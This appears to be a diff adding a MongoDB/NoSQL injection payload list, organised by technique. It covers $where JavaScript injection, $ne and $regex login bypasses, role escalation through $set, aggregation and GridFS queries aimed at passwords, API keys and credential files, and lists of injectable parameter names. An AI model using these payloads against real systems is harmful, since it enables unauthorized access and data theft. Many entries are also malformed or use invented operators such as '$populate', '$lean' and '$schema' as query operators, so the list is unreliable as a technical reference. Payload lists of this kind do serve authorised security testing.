@@ -1,0 +1,383 @@
+# MongoDB NoSQL Injection Payloads
+# For testing MongoDB/NoSQL injection vulnerabilities
+# Target: Port 27017 (default MongoDB port)
+
+# ============================================================================
+# $where OPERATOR INJECTION (Critical - JavaScript Execution)
+# ============================================================================
+
+# Basic $where bypass
+' || 1==1 || '
+' || ''==''
+' || true || '
+' || false || '
+' || this.password == 'password' || '
+' || this.username == 'admin' || '
+' || this.isAdmin == true || '
+
+# $where with JavaScript functions
+' || (function(){return true})() || '
+' || (Math.random() > 0) || '
+' || this.password.match(/./) || '
+' || this.password!==null || '
+' || this.password.length>0 || '
+
+# $where with timing attacks
+' || (function(){sleep(1000)})() || '
+' || (new Date().getTime()) || '
+
+# $where with data exfiltration
+' || this.password || '
+' || this.email || '
+' || tojson(this) || '
+' || Object.keys(this) || '
+' || Object.values(this) || '
+' || JSON.stringify(this) || '
+
+# ============================================================================
+# $ne OPERATOR (Authentication Bypass)
+# ============================================================================
+
+# Basic $ne bypass
+' || $ne != null
+' || $ne != 'x'
+' || $ne == $ne
+' || $ne !== ''
+
+# Authentication bypass combos
+admin' || $ne != null
+admin' || $ne != 'x'
+' || $ne != 'invalidpassword'
+' || $ne == null || '
+
+# Nested operator bypass
+' || $where:'true' || $ne:null
+' || $ne: null || $regex: '.*'
+' || {username: {$ne: null}, password: {$ne: null}}
+
+# ============================================================================
+# $regex OPERATOR INJECTION
+# ============================================================================
+
+# Wildcard regex
+' || $regex: '.*'
+' || $regex: '.*.*'
+' || $regex: 'a.*'
+' || $regex: '[a-zA-Z0-9]*'
+' || $regex: '[\w\d]*'
+
+# Case insensitive regex
+' || $regex: '.*', $options: 'i'
+' || $regex: 'admin', $options: 'i'
+
+# Multiline/extended regex
+' || $regex: '.*', $options: 'm'
+' || $regex: '.*', $options: 's'
+' || $regex: '.*', $options: 'x'
+
+# Negation regex
+' || $regex: '[^x]*'
+' || $not: $regex: 'x'
+
+# Regex OR bypass
+' || $regex: '(a|b|c).*'
+
+# ============================================================================
+# OPERATOR ABUSE ($in, $nin, $gt, $lt, etc.)
+# ============================================================================
+
+# $in operator
+' || $in: [1,2,3,4,5,6,7,8,9,0]
+' || $in: ['admin', 'user', 'test']
+' || $in: [null, '']
+' || $in: []
+
+# $nin operator
+' || $nin: []
+' || $nin: ['invalid']
+' || $nin: ['x']
+
+# $gt (greater than)
+' || $gt: null
+' || $gt: ''
+' || $gt: -999999
+' || $gt: 0
+
+# $lt (less than)
+' || $lt: 999999
+' || $lt: 'zzzzzz'
+
+# $gte (greater than or equal)
+' || $gte: ''
+' || $gte: 0
+
+# $lte (less than or equal)
+' || $lte: '~~~~~~'
+' || $lte: 999999
+
+# $exists operator
+' || $exists: true
+' || $exists: false
+
+# $type operator
+' || $type: 2
+' || $type: 10
+' || $type: 'string'
+
+# $mod operator
+' || $mod: [1, 0]
+' || $mod: [2, 1]
+
+# $size operator
+' || $size: 0
+' || $size: {$gt: -1}
+
+# $all operator
+' || $all: []
+' || $all: [{}]
+
+# $elemMatch operator
+' || $elemMatch: {$ne: null}
+
+# $not operator
+' || $not: null
+' || $not: {$type: 10}
+
+# Logical operators
+' || $or: [{}, {}]
+' || $and: [{$ne: null}, {$ne: ''}]
+' || $nor: [{}, {}]
+
+# ============================================================================
+# JAVASCRIPT INJECTION
+# ============================================================================
+
+# Comparison-based JS
+' || 'a'=='a'
+' || 1==1
+' || 1!=2
+' || true
+' || false
+
+# JavaScript functions
+' || Math.max(1,2)
+' || Date.now()
+' || isNaN(undefined)
+' || typeof this
+
+# $function operator (MongoDB 4.4+)
+' || $function: 'function(){return true}'
+' || $function: 'function(){return this.password}'
+' || $function: 'function(){return JSON.stringify(this)}'
+
+# $accumulator operator
+' || $accumulator: 'function(){return true}'
+
+# $expr operator
+' || $expr: {$eq: [true, true]}
+' || $expr: {$const: true}
+' || $expr: {$lt: [0, 1]}
+
+# eval-like patterns
+' || eval('true')
+' || Function('return true')()
+' || setTimeout('true', 0)
+
+# String manipulation
+' || 'test'.length > 0
+' || 'admin'.includes('a')
+' || 'test'.substring(0)
+' || 'abc'.charAt(0)
+
+# Type coercion
+' || '1' == 1
+' || '0' == false
+' || undefined == null
+' || [] == false
+
+# Array manipulation
+' || [].length == 0
+' || [1].pop()
+' || [1,2].reverse()
+
+# ============================================================================
+# AUTHENTICATION BYPASS
+# ============================================================================
+
+# Username bypass
+admin' || $ne != null #
+admin' || $regex: '.*' #
+admin' || 'a'=='a' #
+admin' || true #
+admin' || 1==1 #
+
+# Password bypass
+password' || $ne != null #
+password' || $ne != 'invalid' #
+password' || $regex: '.*' #
+password' || '' == '' #
+password' || $ne == null #
+
+# Empty password attempts
+
+
+# Null bypass
+null
+' || null #
+
+# Role manipulation
+' || $set: {role: 'admin'} #
+' || $set: {isAdmin: true} #
+' || $push: {roles: 'admin'} #
+
+# ============================================================================
+# JSON-BASED AUTH BYPASS
+# ============================================================================
+
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$ne": null}}
+{"$where": "true"}
+{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"$ne": null}
+{"$where": "return true"}
+
+# ============================================================================
+# AGGREGATION PIPELINE INJECTION
+# ============================================================================
+
+# $lookup for data exfiltration
+' || $lookup: {from: 'users', localField: 'x', foreignField: 'x', as: 'y'} ||
+' || $lookup: {from: 'passwords', localField: 'x', foreignField: 'x', as: 'y'} ||
+' || $lookup: {from: 'admin', localField: 'x', foreignField: 'x', as: 'y'} ||
+' || $lookup: {from: 'fs.files', localField: 'x', foreignField: 'x', as: 'y'} ||
+
+# $project for field projection
+' || $project: {password: 1, email: 1} ||
+' || $project: {password: 1} ||
+' || $project: {secret: 1, apikey: 1} ||
+
+# $match for filtering
+' || $match: {isAdmin: true} ||
+' || $match: {$where: 'true'} ||
+' || $match: {$ne: null} ||
+
+# $group for aggregation
+' || $group: {_id: null, count: {$sum: 1}} ||
+' || $group: {_id: '$password'} ||
+' || $group: {_id: '$email'} ||
+
+# $unwind for array flattening
+' || $unwind: '$password' ||
+' || $unwind: '$roles' ||
+
+# $redact for access control bypass
+' || $redact: {$cond: {if: true, then: '$$KEEP', else: '$$PRUNE'}} ||
+
+# Pipeline arrays
+[{$where: 'true'}]
+[{$match: {$ne: null}}]
+[{$project: {password: 1}}]
+[{$lookup: {from: 'users', as: 'users'}}]
+
+# ============================================================================
+# GRIDFS ABUSE
+# ============================================================================
+
+# GridFS collection access
+' || $lookup: {from: 'fs.files', localField: 'x', foreignField: 'x', as: 'y'} ||
+' || $lookup: {from: 'fs.chunks', localField: 'x', foreignField: 'x', as: 'y'} ||
+
+# GridFS metadata filtering
+' || $match: {contentType: 'application/pdf'} ||
+' || $match: {filename: {$regex: '.*'}} ||
+' || $match: {length: {$gt: 0}} ||
+
+# Sensitive file patterns
+' || $match: {filename: {$in: ['config', 'env', 'credentials']}} ||
+' || $match: {filename: {$regex: '\.(key|pem|cert|p12)'}} ||
+' || $match: {filename: {$regex: '\.(json|yaml|yml|xml)'}} ||
+' || $match: {filename: {$regex: 'password'}} ||
+
+# GridFS chunk access
+' || $project: {data: 1} ||
+' || $limit: 1 ||
+' || $skip: 0 ||
+
+# ============================================================================
+# BSON MANIPULATION
+# ============================================================================
+
+# BSON type manipulation
+' || {$type: 'string'} ||
+' || {$type: 'object'} ||
+' || {$type: 'array'} ||
+' || {$type: 2} ||
+' || {$type: 3} ||
+
+# Nested objects
+' || {$or: [{$and: [{$ne: null}, {$ne: ''}]}]} ||
+' || {$a: {$b: {$c: {$ne: null}}}} ||
+
+# Duplicate keys (last wins in MongoDB)
+{password: 'x', password: {$ne: null}}
+{username: 'admin', username: {$ne: null}}
+
+# ============================================================================
+# PROTOCOL-SPECIFIC PAYLOADS
+# ============================================================================
+
+# MongoDB wire protocol (for direct connection)
+\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\x00admin.$cmd
+{ismaster: 1}
+
+# BSON-encoded payloads
+\x16\x00\x00\x00\x02hello\x00\x06\x00\x00\x00world\x00\x00
+
+# ============================================================================
+# COMMON MONGODB PARAMETER NAMES
+# ============================================================================
+
+# URL parameters that might be injectable
+username=
+user=
+email=
+login=
+name=
+
+password=
+pass=
+pwd=
+passwd=
+
+search=
+query=
+q=
+filter=
+find=
+
+id=
+userId=
+accountId=
+customerId=
+
+role=
+roles=
+permission=
+permissions=
+
+# ============================================================================
+# MONGOOSE/ODM SPECIFIC
+# ============================================================================
+
+# Mongoose populate abuse
+' || $populate: 'password' ||
+' || $populate: {path: 'user', select: 'password'} ||
+
+# Mongoose lean abuse
+' || $lean: true ||
+' || $slice: {$password: 1} ||
+
+# Mongoose schema bypass
+' || $schema: null ||
+' || $validate: false ||
